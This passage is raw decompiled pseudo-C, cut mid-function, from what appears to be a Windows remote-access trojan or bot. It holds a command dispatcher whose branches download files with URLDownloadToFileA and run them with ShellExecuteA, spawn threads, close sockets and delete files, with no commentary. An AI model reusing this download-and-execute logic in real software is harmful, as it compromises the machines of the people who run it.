sub.URLMON.DLL_URLDownloadToFileA();\n        puStack1532 = 0x4795cd;\n        fcn.00489414();\n        piStack1536 = var_ch;\n        piStack1540 = 0x47d220;\n        uStack1544 = 0x4795eb;\n        puStack1532 = &fcn.00474f94::var_590h;\n        fcn.004058e0();\n        uStack1544 = 0x4795f6;\n        cVar1 = fcn.0040a25c();\n        if (cVar1 == '\\0') {\n            *in_FS_OFFSET = piStack1540;\n            goto code_r0x0047c19b;\n        }\n        uStack1544 = 5;\n        uStack1548 = 0;\n        uStack1552 = 0;\n        puStack1556 = 0x47961d;\n        fcn.00489414();\n        puStack1556 = puStack1484;\n        piStack1560 = var_ch;\n        var_618h = 0x47d220;\n        uStack1568 = 0x47963b;\n        fcn.004058e0();\n        uStack1568 = 0x479646;\n        uStack1568 = fcn.004059dc();\n        uStack1572 = 0x47c418;\n        uStack1576 = 0;\n        puStack1580 = 0x479653;\n        sub.shell32.dll_ShellExecuteA();\n        uVar11 = 1;\n        puStack1580 = 0x47965a;\n        fcn.004748f8();\n    }\n    puStack1580 = 0x479667;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1580 = 0x479681;\n        fcn.00405864();\n        puStack1580 = 0x47968c;\n        fcn.00474d1c();\n    }\n    puStack1580 = 0x479699;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1580 = 0x4796a6;\n        fcn.0046afd4();\n        uVar11 = puStack1492 == NULL;\n        if (!uVar11) {\n            puStack1580 = 0x4796ba;\n            fcn.0046afd4();\n            puStack1580 = 0x4796d0;\n            fcn.00405864();\n            puStack1580 = 0x4796db;\n            fcn.00474d1c();\n        }\n    }\n    puStack1580 = &stack0xfffffa20;\n    uStack1584 = 0x4796f4;\n    fcn.00405a44();\n    uStack1584 = 0x479704;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1584 = 0x479718;\n        fcn.00405a84();\n        uStack1584 = 0x47971d;\n        fcn.004319ec();\n        uStack1584 = 0x479725;\n        fcn.00431574();\n    }\n    uStack1584 = 0x479732;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1584 = 5;\n        uStack1588 = 0;\n        uStack1592 = 0;\n        uStack1596 = 0x47d298;\n        uStack1600 = 0x47c418;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004897e8();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.004897e8();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        uVar11 = 1;\n        fcn.004845ac();\n        fcn.00484604();\n        fcn.004845b0();\n        fcn.0041fe70();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1628 = 0x4798c9;\n        fcn.00469b4c();\n        puStack1628 = 0x4798da;\n        fcn.00474ec8(arg_8h_00);\n    }\n    puStack1628 = 0x4798f4;\n    fcn.00405a44();\n    puStack1628 = 0x479904;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1628 = 0x47991c;\n        fcn.00405a84();\n        puStack1628 = &fcn.00474f94::var_ch;\n        piStack1632 = 0x47992d;\n        fcn.00405b28();\n        piStack1632 = 0x47993d;\n        fcn.00405a44();\n        piStack1632 = 0x47994a;\n        fcn.00405b28();\n        piStack1632 = 0x479959;\n        fcn.00405a84();\n        piStack1632 = 0x479964;\n        fcn.004055c8();\n        piStack1632 = 0x47996e;\n        fcn.00405530();\n        piStack1632 = var_ch;\n        uStack1636 = 0x47d314;\n        puStack1640 = var_10h;\n        uStack1644 = 0x479988;\n        fcn.004058e0();\n        uStack456 = *0x4922c4;\n        uVar11 = 1;\n        uStack1644 = 0x4799a5;\n        fcn.00403af4();\n        uStack1644 = 1000;\n        uStack1648 = 0x4799af;\n        sub.kernel32.dll_Sleep_1();\n        uStack1648 = **0x4925a8;\n        puStack1652 = 0x4799bc;\n        sub.wsock32.dll_closesocket();\n    }\n    puStack1652 = &stack0xfffffa0c;\n    puStack1656 = 0x4799d5;\n    fcn.00405a44();\n    puStack1656 = 0x4799e5;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1656 = 0x4799fd;\n        fcn.00405a84();\n        puStack1656 = &fcn.00474f94::var_ch;\n        uStack1660 = 0x479a0e;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        uStack1660 = 0x479a1e;\n        fcn.00405a44();\n        uStack1660 = 0x479a2b;\n        fcn.00405b28();\n        uStack1660 = 0x479a3a;\n        fcn.00405a84();\n        uStack1660 = 0x479a45;\n        fcn.004055c8();\n        uStack1660 = 8;\n        uStack1664 = 0x40;\n        puStack1668 = 0x479a4e;\n        iStack1676 = sub.kernel32.dll_LocalAlloc_1();\n        puStack1668 = 0x479a5c;\n        fcn.00405584();\n        puStack1668 = 0x479a64;\n        uVar3 = fcn.00409ecc();\n        *(iStack1676 + 4) = uVar3;\n        puStack1668 = &fcn.00474f94::var_4h;\n        uStack1672 = 0;\n        pcStack1680 = fcn.00482a64;\n        uStack1684 = 0;\n        uStack1688 = 0;\n        uStack1692 = 0x479a7c;\n        uStack1692 = sub.kernel32.dll_CreateThread_1();\n        puStack1696 = 0x479a82;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    puStack1696 = &stack0xfffffa08;\n    puStack1700 = 0x479a9b;\n    fcn.00405a44();\n    puStack1700 = 0x479aab;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1700 = 0x479ac3;\n        fcn.00405a84();\n        puStack1700 = &stack0xfffffa00;\n        puStack1704 = 0x479adc;\n        fcn.00405a44();\n        puStack1704 = 0x479aed;\n        fcn.004097cc();\n        puStack1704 = 0x479afd;\n        fcn.00405974();\n        if (!uVar11) {\n            puStack1704 = &stack0xfffff9f8;\n            uStack1708 = 0x479b18;\n            fcn.00405a44();\n            uStack1708 = 0x479b29;\n            fcn.004097cc();\n            uStack1708 = 0x479b39;\n            fcn.00405974();\n            if (!uVar11) {\n                uStack1708 = 0x479b4b;\n                fcn.00405864();\n            }\n        }\n        uStack1708 = 5;\n        iStack1720 = fcn.004059dc();\n        sub.shell32.dll_ShellExecuteA();\n        uStack1732 = 0x47d380;\n        puStack1736 = var_8h;\n        fcn.0048b4bc();\n        fcn.004058e0();\n        fcn.00474d1c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048b4bc();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.shell32.dll_ShellExecuteA();\n        fcn.0048b4bc();\n        fcn.004058e0();\n        fcn.00474d1c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048b4bc();\n        fcn.00405864();\n        fcn.00474d1c();\n        sub.kernel32.dll_GetCurrentProcessId();\n        fcn.00483944();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048b4bc();\n        fcn.00405864();\n        fcn.00474d1c();\n        uVar11 = 1;\n        fcn.004748f8();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        uVar11 = 1;\n        puStack1804 = 0x479d51;\n        fcn.0040ef34(&stack0xfffff9c4, *0x47c334);\n        puStack1804 = 0x479d5f;\n        fcn.004055c8();\n        puStack1804 = &stack0xfffff9c0;\n        var_70ch = 0x479d74;\n        fcn.00409854();\n        var_70ch = 0x479d89;\n        fcn.00405a44();\n        var_70ch = 0x479d99;\n        fcn.00405974();\n        if (!uVar11) {\n            var_70ch = 0x479dab;\n            fcn.00405864();\n        }\n        puVar8 = var_8h;\n        if (var_8h != NULL) {\n            puVar8 = var_8h[-1];\n        }\n        if (*(var_8h + -1 + puVar8) == '/') {\n            puStack460 = var_8h;\n            if (var_8h != NULL) {\n                puStack460 = var_8h[-1];\n            }\n            var_70ch = 0x479dff;\n            fcn.00405a84();\n        }\n        var_70ch = 0x479e0c;\n        fcn.00487fc4();\n        var_70ch = 0;\n        var_710h = 0;\n        puStack1816 = 0x479e20;\n        fcn.00489414();\n        puStack1820 = puStack40;\n        uStack1824 = 0x47d220;\n        uStack1828 = 0x479e3e;\n        puStack1816 = &stack0xfffffa18;\n        fcn.004058e0();\n        uStack1828 = 0x479e49;\n        uStack1828 = fcn.004059dc();\n        uStack1832 = 0x479e52;\n        uStack1832 = fcn.004059dc();\n        piStack1836 = NULL;\n        puStack1840 = 0x479e5a;\n        iVar9 = sub.URLMON.DLL_URLDownloadToFileA();\n        if (iVar9 != 0) {\n            puStack1840 = 0x479e69;\n            fcn.0048b4bc();\n            puStack1840 = 0x479e7f;\n            fcn.00405864();\n            puStack1840 = 0x479e8a;\n            fcn.00474d1c();\n            *in_FS_OFFSET = piStack1836;\n            goto code_r0x0047c19b;\n        }\n        puStack1840 = 0x479ea7;\n        fcn.00489414();\n        puStack1840 = puStack1628;\n        puStack1844 = puStack40;\n        piStack1848 = 0x47d220;\n        uStack1852 = 0x479ec5;\n        fcn.004058e0();\n        uStack1852 = 0x479ed0;\n        cVar1 = fcn.0040a25c();\n        if (cVar1 == '\\0') {\n            *in_FS_OFFSET = piStack1848;\n            goto code_r0x0047c19b;\n        }\n        uStack1852 = 0x479eec;\n        fcn.0048b4bc();\n        uStack1852 = 0x479f02;\n        fcn.00405864();\n        uStack1852 = 0x479f0d;\n        fcn.00474d1c();\n        uStack1852 = 5;\n        uStack1856 = 0;\n        uStack1860 = 0;\n        uStack1864 = 0x479f23;\n        fcn.00489414();\n        uStack1864 = uStack1644;\n        puStack1868 = puStack40;\n        uStack1872 = 0x47d220;\n        uStack1876 = 0x479f41;\n        fcn.004058e0();\n        uStack1876 = 0x479f4c;\n        uStack1876 = fcn.004059dc();\n        uStack1880 = 0x47c418;\n        uStack1884 = 0;\n        puStack1888 = 0x479f59;\n        sub.shell32.dll_ShellExecuteA();\n        uVar11 = 1;\n        puStack1888 = 0x479f60;\n        fcn.004748f8();\n    }\n    puStack1888 = &stack0xfffff990;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        uVar11 = 1;\n        puStack1900 = 0x479fca;\n        fcn.0040ef34(&stack0xfffff98c, *0x47c334);\n        puStack1900 = 0x479fd8;\n        fcn.004055c8();\n        puStack1900 = &stack0xfffff988;\n        uStack1904 = 0x479fed;\n        fcn.00409854();\n        uStack1904 = 0x47a002;\n        fcn.00405a44();\n        uStack1904 = 0x47a012;\n        fcn.00405974();\n        if (!uVar11) {\n            uStack1904 = 0x47a024;\n            fcn.00405864();\n        }\n        piVar7 = var_ch;\n        if (var_ch != NULL) {\n            piVar7 = var_ch[-1];\n        }\n        if (*(var_ch + -1 + piVar7) == '/') {\n            piStack464 = var_ch;\n            if (var_ch != NULL) {\n                piStack464 = var_ch[-1];\n            }\n            piStack468 = var_ch;\n            if (var_ch != NULL) {\n                piStack468 = var_ch[-1];\n            }\n            uStack1904 = 0x47a094;\n            fcn.00405a84();\n        }\n        uStack1904 = 0x47a09f;\n        fcn.0048b4bc();\n        uStack1904 = 0x47a0b5;\n        fcn.00405864();\n        uStack1904 = 0x47a0c0;\n        fcn.00474d1c();\n        uStack1904 = 0;\n        uStack1908 = 0;\n        puStack1912 = 0x47a0cf;\n        fcn.004881f8();\n        puStack1912 = &stack0xfffff978;\n        iStack1916 = 0x47a0e4;\n        fcn.00488144();\n        puStack1912 = 0x47a0f0;\n        fcn.00405818();\n        puStack1912 = 0x47a0fb;\n        puStack1912 = fcn.004059dc();\n        iStack1916 = 0x47a104;\n        iStack1916 = fcn.004059dc();\n        piStack1920 = NULL;\n        uStack1924 = 0x47a10c;\n        iVar9 = sub.URLMON.DLL_URLDownloadToFileA();\n        uVar11 = iVar9 == 0;\n        if (!uVar11) {\n            uStack1924 = 0x47a11b;\n            fcn.0048b4bc();\n            uStack1924 = 0x47a131;\n            fcn.00405864();\n            uStack1924 = 0x47a13c;\n            fcn.00474d1c();\n            *in_FS_OFFSET = piStack1920;\n            goto code_r0x0047c19b;\n        }\n        uStack1924 = 0x47a154;\n        fcn.0048b4bc();\n        uStack1924 = 0x47a16a;\n        fcn.00405864();\n        uStack1924 = 0x47a175;\n        fcn.00474d1c();\n        uStack1924 = 5;\n        uStack1928 = 0;\n        uStack1932 = 0;\n        puStack1936 = 0x47a186;\n        fcn.004881f8();\n        puStack1936 = &stack0xfffff960;\n        uStack1940 = 0x47a19b;\n        fcn.00488144();\n        puStack1936 = 0x47a1a7;\n        fcn.00405818();\n        puStack1936 = 0x47a1b2;\n        puStack1936 = fcn.004059dc();\n        uStack1940 = 0x47c418;\n        uStack1944 = 0;\n        puStack1948 = 0x47a1bf;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    puStack1948 = 0x47a1cc;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1948 = &fcn.00474f94::var_4h;\n        puStack1952 = NULL;\n        puStack1956 = NULL;\n        pcStack1960 = fcn.00481eac;\n        var_7a8h = 0;\n        sub.kernel32.dll_CreateThread_1();\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    puStack1948 = 0x47a1f7;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1948 = 0x47a201;\n        fcn.0046d2f4();\n        puStack1948 = 0x47a214;\n        fcn.00405864();\n        puStack1948 = 0x47a21f;\n        fcn.00474d1c();\n    }\n    puStack1948 = &stack0xfffff954;\n    puStack1952 = 0x47a238;\n    fcn.00405a44();\n    puStack1952 = 0x47a248;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1952 = 0x47a260;\n        fcn.00405a84();\n        puStack1952 = &fcn.00474f94::var_ch;\n        puStack1956 = 0x47a271;\n        fcn.00405b28();\n        puStack1956 = 0x47a281;\n        fcn.00405a44();\n        puStack1956 = 0x47a28e;\n        fcn.00405b28();\n        puStack1956 = 0x47a29d;\n        fcn.00405a84();\n        puStack1956 = &fcn.00474f94::var_10h;\n        pcStack1960 = 0x47a2ae;\n        fcn.00405b28();\n        pcStack1960 = 0x47a2be;\n        fcn.00405a44();\n        pcStack1960 = 0x47a2cb;\n        fcn.00405b28();\n        pcStack1960 = 0x47a2da;\n        fcn.00405a84();\n        pcStack1960 = 0x47a2e5;\n        fcn.004055c8();\n        pcStack1960 = 0x47a2f0;\n        fcn.004881f8();\n        pcStack1960 = 0x47a300;\n        fcn.00405818();\n        pcStack1960 = 0x47a30d;\n        fcn.004891a0();\n        pcStack1960 = 0x47a318;\n        fcn.004881f8();\n        pcStack1960 = 0x47a328;\n        fcn.00405818();\n        pcStack1960 = 0x47a335;\n        fcn.004891a0();\n        pcStack1960 = 0x47d764;\n        var_7a8h = 0x47a345;\n        fcn.004881f8();\n        var_7a8h = 0x47a355;\n        fcn.00405818();\n        var_7a8h = iStack1720;\n        fcn.004881f8();\n        fcn.00405818();\n        var_7a8h = 0x47a388;\n        fcn.00466ca8();\n        var_7a8h = 0x47a393;\n        fcn.004881f8();\n        var_7a8h = 0x47a3a3;\n        fcn.00405818();\n        var_7a8h = 0x47a3b1;\n        fcn.004890f8();\n        var_7a8h = 0x47a3bc;\n        fcn.004881f8();\n        var_7a8h = 0x47a3cc;\n        fcn.00405818();\n        uStack472 = uStack1732;\n        var_7a8h = 0x47a3e3;\n        var_7a8h = fcn.004059dc();\n        iVar9 = sub.kernel32.dll_DeleteFileA();\n        uStack476 = uStack476 & 0xffffff | 1 - (iVar9 == 0) << 0x18;\n        fcn.004881f8();\n        fcn.00405818();\n        puStack480 = puStack1736;\n        fcn.004059dc();\n        iVar9 = sub.kernel32.dll_DeleteFileA();\n        uVar11 = iVar9 == 0;\n        uStack484 = uStack484 & 0xffffff | (iVar9 != 0) << 0x18;\n        fcn.00466f48();\n        fcn.00474ec8(arg_8h);\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004059dc();\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405584();\n        fcn.0046d960();\n        fcn.0048995c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        sub.user32.dll_GetSystemMetrics();\n        fcn.00409d60();\n        sub.user32.dll_GetSystemMetrics();\n        fcn.00409d60();\n        fcn.004058e0();\n        fcn.00474d1c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00409ecc();\n        fcn.00409ecc();\n        fcn.00481cb8();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0045f4f8();\n        fcn.00405864();\n        fcn.00474d1c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        cVar1 = fcn.0048a17c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            fcn.00474d1c();\n        }\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048a1d4();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00409ecc();\n        fcn.004619f4();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        sub.ole32.dll_CoInitialize();\n        piVar7 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff7a8;\n        fcn.0042c09c();\n        fcn.00415b5c();\n        fcn.00411648(0, &fcn.00474f94::var_38h, 0x47d8e8, &fcn.00474f94::var_8h);\n        fcn.0041630c();\n        *in_FS_OFFSET = piVar7;\n        sub.ole32.dll_CoUninitialize();\n        return;\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.0046d0dc();\n        fcn.00474ec8(puVar13);\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405818();\n        fcn.0048ae34(0x47d914);\n        fcn.0048b138(0x47d938, var_8h, 0x47d92c, uStack1832);\n        fcn.0048b138(0x47c330, piStack1836);\n        fcn.0048b070(0x47c330, puStack1840);\n        uVar11 = 1;\n        fcn.0048af64(0x47c330, puStack1844);\n        fcn.0048af64(0x47d944, piStack1848);\n        fcn.004058e0(0x47d950, uStack1852);\n        fcn.00474d1c();\n    }\n    fcn.00405a44(&stack0xfffff8c0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00489414();\n        fcn.004058e0(var_8h, 0x47cd24, uStack1864);\n        uStack488 = uStack1860;\n        uVar3 = fcn.004059dc();\n        iVar9 = sub.kernel32.dll_DeleteFileA(uVar3);\n        uVar2 = 1 - (iVar9 == 0);\n        puStack492 = puStack492 & 0xffffff | uVar2 << 0x18;\n        uVar11 = uVar2 == 0;\n        if (!uVar11) {\n            fcn.00474d1c();\n        }\n    }\n    fcn.00405a44(&stack0xfffff8b4);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        cVar1 = fcn.0040a25c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = &fcn.00474f94::var_14h;\n            goto code_r0x0047c19b;\n        }\n        puVar13 = &stack0xfffff8b0;\n        fcn.00409ecc(puVar13, &stack0xfffffffc);\n        fcn.0048b2e4(puVar13);\n        fcn.00474ec8(puVar13);\n    }\n    fcn.00405a44(&stack0xfffff8ac);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28(&fcn.00474f94::var_14h);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00485eec(var_18h);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00485cd4();\n    }\n    fcn.00405a44(&stack0xfffff8a8);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00485ad0();\n    }\n    fcn.00405a44(&stack0xfffff8a4);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_14h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28(&fcn.00474f94::var_18h);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puVar8 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n        uVar3 = fcn.00409ecc();\n        *puVar8 = uVar3;\n        uVar3 = fcn.00482fa8();\n        puVar8[1] = uVar3;\n        uVar3 = fcn.00482fa8();\n        puVar8[2] = uVar3;\n        uVar3 = fcn.00482fa8();\n        puVar8[3] = uVar3;\n        fcn.00405584();\n        uVar3 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.004831cc, puVar8, 0, &fcn.00474f94::var_4h);\n        sub.kernel32.dll_CloseHandle_1(uVar3);\n    }\n    fcn.00405a44(&stack0xfffff8a0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar9 = fcn.00405b28(&fcn.00474f94::var_ch);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.0047f8a8();\n        fcn.0047f828();\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff89c);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28(&fcn.00474f94::var_10h);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00461fd4();\n        fcn.00409ecc();\n        fcn.00462050();\n        fcn.00462054();\n        fcn.00405974();\n        if (uVar11) {\n            fcn.0046204c();\n        }\n        else {\n            uVar11 = 1;\n            fcn.0046204c();\n        }\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff898);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.0047f144();\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff894);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.0047fdc4();\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff890);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        piStack2356 = &fcn.00474f94::var_10h;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        **0x492510 = iVar9;\n        *(**0x492510 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00461fd4();\n        fcn.00409ecc();\n        fcn.00462050();\n        fcn.00462054();\n        fcn.00405974();\n        if (uVar11) {\n            fcn.0046204c();\n        }\n        else {\n            uVar11 = 1;\n            fcn.0046204c();\n        }\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff88c);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x492510 == 0,  !uVar11)) {\n        fcn.0041fe98();\n    }\n    fcn.00405a44(&stack0xfffff888);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        uVar11 = **0x4923a8 == 0;\n        if (!uVar11) {\n            cVar1 = fcn.00487f90();\n            uVar11 = cVar1 == '\\0';\n            if (!uVar11) {\n                fcn.0041fe98();\n            }\n        }\n        iVar9 = fcn.0041f9b4();\n        **0x4923a8 = iVar9;\n        *(**0x4923a8 + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00487f40();\n        fcn.00409ecc();\n        fcn.00487f8c();\n        fcn.0041fe70();\n    }\n    piVar7 = &stack0xfffff884;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        if (**0x4923a8 == 0) {\n            *in_FS_OFFSET = piVar7;\n            goto code_r0x0047c19b;\n        }\n        cVar1 = fcn.00487f90();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = piVar7;\n            goto code_r0x0047c19b;\n        }\n        fcn.00487eac();\n    }\n    piVar7 = &stack0xfffff880;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        if (**0x4923a8 == 0) {\n            *in_FS_OFFSET = piVar7;\n            goto code_r0x0047c19b;\n        }\n        cVar1 = fcn.00487f90();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = piVar7;\n            goto code_r0x0047c19b;\n        }\n        fcn.0041fe98();\n    }\n    fcn.00405a44(&stack0xfffff87c);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_14h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_18h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.00474f94::var_1ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&stack0xffffffdc);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28(&stack0xffffffd8);\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar9 = fcn.0041f9b4();\n        **0x4923bc = iVar9;\n        *(**0x4923bc + 0xf) = 1;\n        fcn.0041fbc0();\n        fcn.00409ecc();\n        fcn.004868dc();\n        fcn.00409ecc();\n        fcn.004868e0();\n        fcn.004868f4();\n        fcn.00409ecc();\n        fcn.00486940();\n        fcn.00486a24();\n        fcn.00486954();\n        fcn.004869bc();\n        fcn.00486a8c();\n        fcn.0041fe70();\n    }\n    fcn.00405a44(&stack0xfffff878);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x4923bc == 0,  !uVar11)) {\n        cVar1 = fcn.00486af4();\n        uVar11 = cVar1 == '\\0';\n        if (!uVar11) {\n            fcn.0041fe98();\n        }\n    }\n    puVar8 = &stack0xfffff874;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        